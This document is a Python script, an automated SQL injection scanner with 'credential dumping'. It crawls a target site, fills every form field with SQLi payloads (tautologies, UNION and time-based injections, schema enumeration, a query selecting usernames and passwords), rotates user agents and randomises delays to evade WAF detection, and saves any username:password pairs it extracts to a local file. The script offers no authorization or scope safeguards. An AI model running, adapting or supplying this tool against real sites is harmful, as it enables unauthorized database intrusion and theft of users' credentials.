import requests
import logging
import threading
import time
import random
import string
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from collections import deque
from requests.exceptions import RequestException
import colorlog  # For colored logging

# Setup colored logging
LOG_FORMAT = "[%(levelname)s] %(message)s"
logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

# Create a color log handler with a proper colored formatter
logger = logging.getLogger()
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s[%(levelname)s] %(message)s",
    datefmt=None,
    log_colors={
        'DEBUG': 'yellow',
        'INFO': 'yellow',
        'WARNING': 'yellow',
        'ERROR': 'yellow',
        'CRITICAL': 'yellow'
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)

# Global variables
found_vulnerabilities = []
lock = threading.Lock()
payloads = []
waf_bypass_payloads = ['/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--']
threads = []

# SQL injection payloads
payloads += [
    "' OR 1=1 --",  # Basic SQLi payload
    "' OR 'a'='a",  # Another simple SQL injection
    "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
    "' AND 1=2 --",  # False condition (error-based)
    "' OR 1=1 LIMIT 1 --",  # Limits
    "' AND SLEEP(5) --",  # Time-based injection
    "' OR 1=1 --",  # Common injection
    "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
]

# Headers to make requests seem normal
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Time delay to avoid hitting WAFs
def delay_request():
    time.sleep(random.uniform(0.5, 1.5))  # Random delay between 0.5 and 1.5 seconds

# Function to evade WAF detection using user-agent rotation
def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; en-US) like Gecko',
    ]
    return random.choice(agents)

# Function to perform SQL injection on a URL with the given payloads
def test_sql_injection(url, method, form_data):
    for payload in payloads:
        data = form_data.copy()  # Avoid modifying original form data
        for key in data:
            data[key] = payload  # Inject the payload into each form input field

        try:
            delay_request()
            headers['User-Agent'] = get_random_user_agent()
            if method.lower() == 'get':
                response = requests.get(url, params=data, headers=headers, timeout=5)
            elif method.lower() == 'post':
                response = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                continue

            if "error" in response.text.lower() or response.status_code == 500:  # Error-based SQLi detection
                with lock:
                    found_vulnerabilities.append((url, payload, "Possible SQL Injection"))
                    logger.info(f"SQL Injection found at {url} with payload {payload}")
            elif response.status_code == 200 and "mysql" in response.text.lower():  # MySQL-based vulnerability detection
                with lock:
                    found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
                    logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
                logger.info(f"[CREDENTIALS DUMP] Found credentials at {url} with payload {payload}")
                dump_credentials(response.text)
                break  # Stop further scanning after detecting vulnerability

            # Print success message if vulnerability is detected
            if response.status_code == 200 and ('username' in response.text or 'password' in response.text):
                logger.info(f"[SUCCESS] ACCESS GRANTED WITH PAYLOAD: {payload}")
                
        except RequestException as e:
            logger.info(f"Error testing {url}: {str(e)}")

# Function to save the credentials dump to a file
def dump_credentials(data):
    # Look for the usernames and passwords in the response content.
    # This is a simplified approach, assuming the credentials are easily extractable.
    # Adjust this logic based on actual structure of the credentials data.
    import re
    credentials = re.findall(r'(\w+)\s*:\s*(\S+)', data)  # Match username:password pairs
    if credentials:
        with open('dumped_credentials.txt', 'a') as f:
            for username, password in credentials:
                f.write(f"Username: {username} | Password: {password}\n")
        logger.info("Credentials dumped to 'dumped_credentials.txt'.")
    else:
        logger.info("No credentials found in response.")

# Function to scan forms on a page
def scan_forms(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        logger.info(f"Scanning {len(forms)} forms on {url}")

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            action_url = urljoin(url, action)

            form_data = {}
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_data[name] = ""  # Empty data for injection

            if form_data:
                test_sql_injection(action_url, method, form_data)
            else:
                logger.info(f"No form inputs found on {url}.")
    except RequestException as e:
        logger.info(f"Error while fetching {url}: {str(e)}")

# Function to crawl and explore the target URL (multiple pages)
def crawl(url):
    urls_to_scan = deque([url])
    visited_urls = set()

    while urls_to_scan:
        current_url = urls_to_scan.popleft()

        if current_url in visited_urls:
            continue

        visited_urls.add(current_url)
        logger.info(f"Scanning {current_url}")
        scan_forms(current_url)

        # Crawl links on the page
        try:
            response = requests.get(current_url, headers=headers, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract all hyperlinks
            links = soup.find_all('a', href=True)
            for link in links:
                full_url = urljoin(current_url, link['href'])
                parsed_url = urlparse(full_url)
                if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
                    urls_to_scan.append(full_url)

        except RequestException as e:
            logger.info(f"Error fetching links from {current_url}: {str(e)}")

# Main function
def main(target_url):
    logger.info(f"Starting SQL Injection scan on {target_url}")
    start_time = time.time()

    crawl(target_url)

    if found_vulnerabilities:
        logger.info("SQL Injection vulnerabilities found:")
        for vuln in found_vulnerabilities:
            print(f"Vulnerability found at: {vuln[0]} with payload: {vuln[1]}")

    else:
        logger.info("No vulnerabilities found.")

    logger.info(f"Scan completed in {time.time() - start_time:.2f} seconds")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Credential Dumping")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
    args = parser.parse_args()

    main(args.url)
